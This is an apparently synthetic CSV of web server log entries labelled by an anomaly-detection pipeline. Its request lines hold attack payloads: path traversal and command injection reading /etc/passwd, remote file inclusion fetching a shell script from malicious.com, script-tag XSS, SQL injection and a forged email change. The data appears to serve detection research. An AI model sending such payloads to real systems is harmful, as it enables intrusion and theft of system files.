ip,timestamp,request,status,size,size_zscore,size_anomaly,request_length,status_code,iso_forest,is_anomaly
42.2.135.176,2025-03-15 12:12:09,POST /change-email?email=attacker@example.com HTTP/1.1,200,4212,1.1285611870962515,False,54,200,True,True
248.180.191.122,2025-03-15 12:12:35,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4903,1.6591263255153694,False,51,403,True,True
228.2.69.79,2025-03-15 12:12:29,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,765,-1.5181219274199562,False,59,200,True,True
37.191.18.170,2025-03-15 12:11:58,POST /change-email?email=attacker@example.com HTTP/1.1,200,4846,1.6153604602622729,False,54,200,True,True
195.183.123.137,2025-03-15 12:12:33,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4936,1.68446445803032,False,47,403,True,True
183.193.167.46,2025-03-15 12:12:39,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1360,-1.061267719953422,False,60,200,True,True
223.6.164.64,2025-03-15 12:12:00,POST /change-email?email=attacker@example.com HTTP/1.1,200,4198,1.1178116763323331,False,54,200,True,True
62.155.7.32,2025-03-15 12:12:53,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4887,1.6468411703566055,False,47,403,True,True
175.0.138.100,2025-03-15 12:12:06,GET /admin HTTP/1.1,403,573,-1.6655437893251235,False,19,403,True,True
170.84.145.136,2025-03-15 12:12:19,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3064,0.24710130445493833,False,60,200,True,True
195.201.148.11,2025-03-15 12:12:14,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4346,1.2314493615508995,False,47,403,True,True
238.68.134.136,2025-03-15 12:12:13,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3506,0.5864787157157924,False,60,200,True,True
242.99.9.177,2025-03-15 12:12:28,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,675,-1.5872259251880034,False,60,200,True,True
197.207.9.6,2025-03-15 12:13:01,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4568,1.4019058893787493,False,47,403,True,True
126.194.14.244,2025-03-15 12:12:15,POST /change-email?email=attacker@example.com HTTP/1.1,200,859,-1.445946640862218,False,54,200,True,True
226.211.197.172,2025-03-15 12:12:45,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4787,1.5700589506143308,False,51,403,True,True
52.182.80.121,2025-03-15 12:12:58,POST /change-email?email=attacker@example.com HTTP/1.1,200,4625,1.4456717546318458,False,54,200,True,True
67.118.136.208,2025-03-15 12:12:51,POST /change-email?email=attacker@example.com HTTP/1.1,200,4403,1.275215226803996,False,54,200,True,True
127.35.95.155,2025-03-15 12:12:58,POST /wp-json/wp/v2/users HTTP/1.1,403,565,-1.6716863669045054,False,34,403,True,True
217.35.9.73,2025-03-15 12:12:14,POST /change-email?email=attacker@example.com HTTP/1.1,200,4455,1.315141981069979,False,54,200,True,True
139.44.185.112,2025-03-15 12:12:50,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4857,1.6238065044339232,False,59,200,True,True
45.253.108.55,2025-03-15 12:12:43,POST /change-email?email=attacker@example.com HTTP/1.1,200,930,-1.391431264845203,False,54,200,True,True
9.178.193.40,2025-03-15 12:13:04,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,587,-1.654794278561205,False,51,403,True,True
23.173.26.125,2025-03-15 12:12:51,GET /admin HTTP/1.1,403,4945,1.6913748578071248,False,19,403,True,True
51.50.36.12,2025-03-15 12:12:51,GET /admin HTTP/1.1,403,706,-1.5634234370678983,False,19,403,True,True
36.6.147.160,2025-03-15 12:13:01,GET /admin HTTP/1.1,403,4751,1.542417351507112,False,19,403,True,True
44.203.78.150,2025-03-15 12:12:32,POST /upload-xml HTTP/1.1,403,4857,1.6238065044339232,False,25,403,True,True
195.152.203.93,2025-03-15 12:12:16,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,756,-1.525032327196761,False,47,403,True,True
215.174.236.212,2025-03-15 12:12:27,GET /execute?cmd=whoami HTTP/1.1,403,640,-1.6140997020977996,False,32,403,True,True
215.76.240.47,2025-03-15 12:13:08,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,756,-1.525032327196761,False,51,403,True,True
197.116.29.180,2025-03-15 12:13:07,GET /admin HTTP/1.1,403,817,-1.4781951731539733,False,19,403,True,True
211.188.227.171,2025-03-15 12:12:16,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3472,0.5603727610034189,False,60,200,True,True
188.205.51.29,2025-03-15 12:12:42,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,634,-1.618706635282336,False,60,200,True,True
185.215.105.148,2025-03-15 12:13:06,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3873,0.8682694621699404,False,60,200,True,True
5.82.123.171,2025-03-15 12:12:16,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4414,1.2836612709756463,False,59,200,True,True
147.211.109.75,2025-03-15 12:13:12,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,809,-1.4843377507333553,False,47,403,True,True
112.163.86.126,2025-03-15 12:12:36,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4802,1.581576283575672,False,51,403,True,True
103.74.6.178,2025-03-15 12:12:19,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4615,1.4379935326576183,False,60,200,True,True
157.123.133.42,2025-03-15 12:12:35,POST /upload-xml HTTP/1.1,403,4853,1.620735215644232,False,25,403,True,True
47.92.151.126,2025-03-15 12:12:40,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4360,1.242198872314818,False,60,200,True,True
231.247.241.54,2025-03-15 12:12:36,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4917,1.6698758362792878,False,60,200,True,True
196.158.219.180,2025-03-15 12:13:08,POST /change-email?email=attacker@example.com HTTP/1.1,200,1075,-1.2800970462189047,False,54,200,True,True
36.6.1.78,2025-03-15 12:13:14,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4785,1.5685233062194854,False,59,200,True,True
47.72.247.163,2025-03-15 12:12:58,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3507,0.5872465379132151,False,60,200,True,True
94.237.210.185,2025-03-15 12:12:33,POST /wp-json/wp/v2/users HTTP/1.1,403,553,-1.6809002332735785,False,34,403,True,True
54.153.107.141,2025-03-15 12:12:34,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,989,-1.3461297551972609,False,59,200,True,True
223.11.181.7,2025-03-15 12:12:33,GET /admin HTTP/1.1,403,4689,1.4948123752669016,False,19,403,True,True
127.110.166.38,2025-03-15 12:12:21,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4878,1.6399307705798007,False,51,403,True,True
122.196.26.197,2025-03-15 12:12:33,POST /change-email?email=attacker@example.com HTTP/1.1,200,1012,-1.3284698446565377,False,54,200,True,True
47.154.58.143,2025-03-15 12:13:17,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4324,1.214557273207599,False,47,403,True,True
177.145.18.43,2025-03-15 12:12:21,GET /admin HTTP/1.1,403,657,-1.601046724741613,False,19,403,True,True
37.167.28.26,2025-03-15 12:13:04,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,549,-1.6839715220632694,False,47,403,True,True
57.98.255.206,2025-03-15 12:12:49,GET /search?q=' OR '1'='1 HTTP/1.1,403,516,-1.70930965457822,False,34,403,True,True
43.61.130.41,2025-03-15 12:12:47,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4883,1.6437698815669144,False,51,403,True,True
117.5.80.39,2025-03-15 12:13:06,POST /change-email?email=attacker@example.com HTTP/1.1,200,4445,1.3074637590957514,False,54,200,True,True
52.113.232.10,2025-03-15 12:12:56,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4375,1.2537162052761592,False,51,403,True,True
244.203.30.103,2025-03-15 12:12:25,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4726,1.5232217965715433,False,47,403,True,True
115.6.25.97,2025-03-15 12:12:45,GET /admin HTTP/1.1,403,738,-1.5388531267503704,False,19,403,True,True
20.202.164.133,2025-03-15 12:12:42,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4266,1.1700235857570798,False,60,200,True,True
41.230.52.194,2025-03-15 12:12:59,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4646,1.4617960207777236,False,51,403,True,True
190.138.22.91,2025-03-15 12:12:49,POST /change-email?email=attacker@example.com HTTP/1.1,200,4369,1.2491092720916228,False,54,200,True,True
93.188.235.189,2025-03-15 12:12:45,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4966,1.7074991239530024,False,60,200,True,True
254.239.84.181,2025-03-15 12:12:45,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3045,0.23251268270390615,False,60,200,True,True
16.95.173.18,2025-03-15 12:12:48,POST /upload-xml HTTP/1.1,403,508,-1.715452232157602,False,25,403,True,True
8.3.241.173,2025-03-15 12:13:17,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1185,-1.1956366045024027,False,59,200,True,True
215.87.28.162,2025-03-15 12:13:15,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4588,1.4172623333272043,False,47,403,True,True
36.113.143.13,2025-03-15 12:12:37,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4613,1.436457888262773,False,47,403,True,True
237.55.14.54,2025-03-15 12:12:41,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,572,-1.6663116115225463,False,47,403,True,True
141.197.249.141,2025-03-15 12:13:06,POST /wp-json/wp/v2/users HTTP/1.1,403,590,-1.6524908119689368,False,34,403,True,True
243.64.48.65,2025-03-15 12:13:02,POST /change-email?email=attacker@example.com HTTP/1.1,200,4427,1.293642959542142,False,54,200,True,True
153.190.65.129,2025-03-15 12:12:35,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4459,1.31821326985967,False,47,403,True,True
114.114.181.15,2025-03-15 12:13:11,POST /change-email?email=attacker@example.com HTTP/1.1,200,4824,1.5984683719189725,False,54,200,True,True
154.19.166.60,2025-03-15 12:12:40,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,703,-1.5657269036601664,False,47,403,True,True
15.234.104.119,2025-03-15 12:12:59,POST /upload-xml HTTP/1.1,403,551,-1.682435877668424,False,25,403,True,True
216.116.6.79,2025-03-15 12:13:25,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4460,1.3189810920570926,False,59,200,True,True
218.82.19.164,2025-03-15 12:12:53,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4401,1.2736795824091507,False,51,403,True,True
82.210.89.57,2025-03-15 12:12:50,POST /wp-json/wp/v2/users HTTP/1.1,403,649,-1.6071893023209949,False,34,403,True,True
234.90.240.52,2025-03-15 12:12:34,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4513,1.3596756685204983,False,60,200,True,True
49.199.243.79,2025-03-15 12:12:47,GET /search?q=' OR '1'='1 HTTP/1.1,403,538,-1.6924175662349197,False,34,403,True,True
104.84.91.131,2025-03-15 12:12:45,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,512,-1.7123809433679111,False,59,200,True,True
6.142.171.255,2025-03-15 12:13:08,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4304,1.1992008292591443,False,60,200,True,True
218.49.203.24,2025-03-15 12:13:14,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1739,-0.770263107130201,False,60,200,True,True
156.173.21.183,2025-03-15 12:12:53,POST /upload-xml HTTP/1.1,403,4907,1.6621976143050605,False,25,403,True,True
232.33.188.174,2025-03-15 12:13:20,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4164,1.0917057216199597,False,60,200,True,True
248.144.59.175,2025-03-15 12:12:36,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1466,-0.9798785670266108,False,60,200,True,True
15.183.61.24,2025-03-15 12:12:45,GET /admin HTTP/1.1,403,4994,1.7289981454808394,False,19,403,True,True
123.77.71.56,2025-03-15 12:13:25,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4330,1.2191642063921355,False,47,403,True,True
100.41.210.223,2025-03-15 12:13:21,POST /change-email?email=attacker@example.com HTTP/1.1,200,4454,1.3143741588725562,False,54,200,True,True
45.243.93.248,2025-03-15 12:12:51,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3914,0.899750172264273,False,60,200,True,True
79.11.213.190,2025-03-15 12:13:31,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4902,1.6583585033179467,False,60,200,True,True
5.190.64.56,2025-03-15 12:12:48,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1085,-1.2724188242446772,False,59,200,True,True
137.96.228.107,2025-03-15 12:12:39,POST /change-email?email=attacker@example.com HTTP/1.1,200,4104,1.0456363897745948,False,54,200,True,True
158.184.246.42,2025-03-15 12:12:46,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1728,-0.7787091513018511,False,60,200,True,True
144.3.7.186,2025-03-15 12:13:04,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,613,-1.6348309014282136,False,60,200,True,True
3.47.254.232,2025-03-15 12:12:43,GET /admin HTTP/1.1,403,747,-1.5319427269735657,False,19,403,True,True
3.81.86.172,2025-03-15 12:13:31,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4854,1.6215030378416548,False,51,403,True,True
184.221.144.106,2025-03-15 12:13:07,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,2917,0.1342314414337946,False,60,200,True,True
34.198.67.47,2025-03-15 12:13:35,POST /change-email?email=attacker@example.com HTTP/1.1,200,570,-1.6678472559173918,False,54,200,True,True
11.5.48.37,2025-03-15 12:13:24,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,522,-1.7047027213936836,False,60,200,True,True
17.253.214.10,2025-03-15 12:13:02,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,2928,0.1426774856054448,False,60,200,True,True
104.178.147.95,2025-03-15 12:12:43,GET /admin HTTP/1.1,403,4927,1.6775540582535153,False,19,403,True,True
225.138.106.148,2025-03-15 12:12:52,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,516,-1.70930965457822,False,60,200,True,True
166.167.233.15,2025-03-15 12:12:56,POST /change-email?email=attacker@example.com HTTP/1.1,200,4612,1.4356900660653502,False,54,200,True,True
204.92.132.95,2025-03-15 12:13:28,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4632,1.451046510013805,False,59,200,True,True
69.251.91.120,2025-03-15 12:13:21,GET /admin HTTP/1.1,403,552,-1.6816680554710013,False,19,403,True,True
197.145.115.91,2025-03-15 12:13:14,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1399,-1.0313226542539349,False,60,200,True,True
242.207.183.100,2025-03-15 12:12:53,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3804,0.8152897305477709,False,60,200,True,True
57.124.170.209,2025-03-15 12:12:49,POST /upload-xml HTTP/1.1,403,634,-1.618706635282336,False,25,403,True,True
180.22.250.82,2025-03-15 12:13:24,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4927,1.6775540582535153,False,51,403,True,True
25.155.208.138,2025-03-15 12:13:39,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4982,1.7197842791117663,False,51,403,True,True
179.224.11.149,2025-03-15 12:13:20,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4643,1.4594925541854553,False,59,200,True,True
101.218.121.107,2025-03-15 12:12:49,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,916,-1.4021807756091214,False,59,200,True,True
44.23.212.22,2025-03-15 12:13:25,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4488,1.3404801135849296,False,51,403,True,True
240.219.105.20,2025-03-15 12:13:10,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,962,-1.366860954527675,False,60,200,True,True
240.203.230.232,2025-03-15 12:13:31,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,1190,-1.1917974935152889,False,51,403,True,True
248.61.5.242,2025-03-15 12:13:04,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,984,-1.3499688661843747,False,51,403,True,True
217.74.214.4,2025-03-15 12:13:39,GET /admin HTTP/1.1,403,4962,1.7044278351633115,False,19,403,True,True
112.213.208.3,2025-03-15 12:13:33,POST /change-email?email=attacker@example.com HTTP/1.1,200,4026,0.9857462583756206,False,54,200,True,True
224.201.137.139,2025-03-15 12:12:55,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,868,-1.4390362410854134,False,51,403,True,True
183.234.161.25,2025-03-15 12:13:17,POST /wp-json/wp/v2/users HTTP/1.1,403,570,-1.6678472559173918,False,34,403,True,True
164.220.245.207,2025-03-15 12:13:31,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,518,-1.7077740101833747,False,47,403,True,True
80.156.105.126,2025-03-15 12:13:07,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4418,1.2867325597653374,False,47,403,True,True
12.228.188.105,2025-03-15 12:13:02,GET /admin HTTP/1.1,403,4651,1.4656351317648373,False,19,403,True,True
25.228.57.22,2025-03-15 12:13:01,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1074,-1.2808648684163275,False,59,200,True,True
15.23.128.102,2025-03-15 12:12:56,GET /admin HTTP/1.1,403,661,-1.5979754359519218,False,19,403,True,True
45.168.0.171,2025-03-15 12:13:36,GET /admin HTTP/1.1,403,651,-1.6056536579261493,False,19,403,True,True
96.242.80.242,2025-03-15 12:13:48,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4581,1.411887577945245,False,60,200,True,True
66.234.249.176,2025-03-15 12:13:15,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4474,1.3297306028210112,False,47,403,True,True
198.67.173.10,2025-03-15 12:13:52,GET /admin HTTP/1.1,403,4687,1.4932767308720563,False,19,403,True,True
118.154.59.168,2025-03-15 12:13:36,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3012,0.20717455018895553,False,60,200,True,True
251.106.248.79,2025-03-15 12:13:33,POST /change-email?email=attacker@example.com HTTP/1.1,200,4622,1.4433682880395777,False,54,200,True,True
37.27.249.129,2025-03-15 12:13:41,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,944,-1.3806817540812846,False,59,200,True,True
20.159.24.95,2025-03-15 12:13:47,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4873,1.636091659592687,False,51,403,True,True
51.69.136.54,2025-03-15 12:13:09,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,576,-1.6632403227328554,False,47,403,True,True
41.85.81.154,2025-03-15 12:13:05,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4911,1.6652689030947514,False,59,200,True,True
26.181.83.235,2025-03-15 12:13:38,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3351,0.4674662751152666,False,60,200,True,True
85.130.130.38,2025-03-15 12:13:26,POST /change-email?email=attacker@example.com HTTP/1.1,200,4732,1.5278287297560798,False,54,200,True,True
168.180.240.255,2025-03-15 12:13:30,GET /admin HTTP/1.1,403,730,-1.5449957043297524,False,19,403,True,True
145.70.217.48,2025-03-15 12:13:12,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4881,1.642234237172069,False,47,403,True,True
221.128.25.183,2025-03-15 12:13:17,POST /wp-json/wp/v2/users HTTP/1.1,403,596,-1.6478838787844003,False,34,403,True,True
26.157.252.212,2025-03-15 12:13:11,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4640,1.457189087593187,False,47,403,True,True
5.107.254.181,2025-03-15 12:13:51,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4941,1.6883035690174337,False,59,200,True,True
91.75.154.204,2025-03-15 12:13:55,POST /change-email?email=attacker@example.com HTTP/1.1,200,4299,1.1953617182720304,False,54,200,True,True
252.22.245.59,2025-03-15 12:13:41,POST /upload-xml HTTP/1.1,403,538,-1.6924175662349197,False,25,403,True,True
63.186.221.242,2025-03-15 12:13:26,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,721,-1.5519061041065572,False,59,200,True,True
75.48.19.86,2025-03-15 12:13:46,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4776,1.5616129064426807,False,51,403,True,True
206.142.103.29,2025-03-15 12:13:59,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1775,-0.7426215080229821,False,60,200,True,True
221.163.83.188,2025-03-15 12:13:08,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4584,1.4141910445375132,False,59,200,True,True
208.114.144.222,2025-03-15 12:13:51,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3004,0.20103197260957353,False,60,200,True,True
187.83.54.121,2025-03-15 12:13:39,GET /admin HTTP/1.1,403,619,-1.6302239682436772,False,19,403,True,True
223.16.186.155,2025-03-15 12:13:32,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,2894,0.11657153089307142,False,60,200,True,True
197.211.127.82,2025-03-15 12:13:51,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4465,1.3228202030442064,False,59,200,True,True
62.63.56.23,2025-03-15 12:13:38,POST /change-email?email=attacker@example.com HTTP/1.1,200,4312,1.2053434068385263,False,54,200,True,True
65.129.173.155,2025-03-15 12:14:00,GET /execute?cmd=whoami HTTP/1.1,403,4996,1.730533789875685,False,32,403,True,True
244.29.200.109,2025-03-15 12:13:50,GET /admin HTTP/1.1,403,4829,1.6023074829060862,False,19,403,True,True
207.242.84.78,2025-03-15 12:13:23,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,665,-1.594904147162231,False,59,200,True,True
221.121.160.206,2025-03-15 12:13:43,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,2976,0.17953295108173664,False,60,200,True,True
165.115.150.144,2025-03-15 12:15:06,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,4497,1.3473905133617343,False,47,200,True,True
109.98.55.70,2025-03-15 12:14:44,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1293,-1.112711807180746,False,60,200,True,True
28.201.123.80,2025-03-15 12:14:28,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4782,1.5662198396272171,False,60,200,True,True
92.146.90.253,2025-03-15 12:14:40,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4459,1.31821326985967,False,60,200,True,True
25.57.54.153,2025-03-15 12:14:55,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,586,-1.6555621007586279,False,51,403,True,True
166.4.210.49,2025-03-15 12:15:07,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4288,1.1869156741003803,False,60,200,True,True
160.18.42.112,2025-03-15 12:15:14,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,512,-1.7123809433679111,False,59,200,True,True
125.21.193.80,2025-03-15 12:14:54,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1148,-1.2240460258070442,False,60,200,True,True
121.50.36.184,2025-03-15 12:14:48,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4548,1.3865494454302945,False,59,200,True,True
79.50.194.75,2025-03-15 12:14:37,GET /admin HTTP/1.1,403,4613,1.436457888262773,False,19,403,True,True
107.148.196.103,2025-03-15 12:14:56,POST /change-email?email=attacker@example.com HTTP/1.1,403,3819,0.826807063509112,False,54,403,True,True
175.127.212.50,2025-03-15 12:14:41,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,776,-1.509675883248306,False,51,403,True,True
150.134.237.199,2025-03-15 12:14:52,POST /change-email?email=attacker@example.com HTTP/1.1,403,1683,-0.8132611501858747,False,54,403,True,True
5.118.146.96,2025-03-15 12:14:33,POST /change-email?email=attacker@example.com HTTP/1.1,403,4120,1.0579215449333588,False,54,403,True,True
36.9.233.130,2025-03-15 12:14:31,GET /api/user?username=admin HTTP/1.1,403,786,-1.5019976612740786,False,37,403,True,True
69.154.167.188,2025-03-15 12:14:42,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4682,1.4894376198849424,False,51,403,True,True
67.178.27.9,2025-03-15 12:14:48,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1021,-1.321559444879733,False,59,200,True,True
15.163.238.54,2025-03-15 12:15:03,POST /change-email?email=attacker@example.com HTTP/1.1,403,2993,0.19258592843792333,False,54,403,True,True
220.24.156.151,2025-03-15 12:14:33,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,4211,1.1277933648988288,False,47,200,True,True
252.51.153.57,2025-03-15 12:14:55,GET /execute?cmd=whoami HTTP/1.1,403,4968,1.709034768347848,False,32,403,True,True
19.206.156.97,2025-03-15 12:14:58,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4730,1.5262930853612342,False,60,200,True,True
186.26.8.59,2025-03-15 12:14:51,POST /change-email?email=attacker@example.com HTTP/1.1,403,1406,-1.0259478988719757,False,54,403,True,True
152.168.142.211,2025-03-15 12:15:03,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4526,1.3696573570869939,False,59,200,True,True
121.85.44.228,2025-03-15 12:15:10,POST /change-email?email=attacker@example.com HTTP/1.1,403,1945,-0.6120917344611152,False,54,403,True,True
37.92.171.191,2025-03-15 12:15:14,GET /admin HTTP/1.1,403,576,-1.6632403227328554,False,19,403,True,True
43.191.52.190,2025-03-15 12:15:03,POST /change-email?email=attacker@example.com HTTP/1.1,403,4723,1.520918329979275,False,54,403,True,True
230.61.224.115,2025-03-15 12:15:10,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1475,-0.9729681672498061,False,60,200,True,True
17.177.209.67,2025-03-15 12:15:04,POST /change-email?email=attacker@example.com HTTP/1.1,403,4726,1.5232217965715433,False,54,403,True,True
210.86.8.242,2025-03-15 12:14:40,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4515,1.3612113129153438,False,60,200,True,True
137.100.62.41,2025-03-15 12:14:47,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3060,0.24403001566524735,False,60,200,True,True
193.196.198.255,2025-03-15 12:15:08,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,788,-1.500462016879233,False,47,200,True,True
162.96.38.205,2025-03-15 12:14:40,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4711,1.5117044636102022,False,51,403,True,True
96.13.215.26,2025-03-15 12:15:08,GET /admin HTTP/1.1,403,4700,1.5032584194385519,False,19,403,True,True
150.134.164.53,2025-03-15 12:15:18,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,806,-1.4866412173256236,False,60,200,True,True
13.147.185.142,2025-03-15 12:14:40,GET /api/user?username=admin HTTP/1.1,403,4736,1.5309000185457708,False,37,403,True,True
76.50.138.208,2025-03-15 12:14:38,POST /change-email?email=attacker@example.com HTTP/1.1,403,4009,0.972693281019434,False,54,403,True,True
